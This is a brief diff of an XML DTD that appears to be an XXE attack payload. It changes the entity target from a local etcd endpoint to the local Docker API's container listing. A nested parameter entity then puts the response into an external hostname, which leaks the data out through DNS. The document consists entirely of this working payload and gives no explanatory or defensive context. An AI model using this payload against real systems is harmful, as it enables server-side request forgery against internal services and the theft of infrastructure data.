@@ -1,4 +1,4 @@
-<!ENTITY % payload SYSTEM "http://127.0.0.1:2379/version">
+<!ENTITY % payload SYSTEM "http://127.0.0.1:2375/v1.24/containers/json">
 <!ENTITY % param1 '<!ENTITY &#37; external SYSTEM "http://afaafdsafdasfafdsfafaslll.do-not-exist.%payload;">'>
 
 %param1;
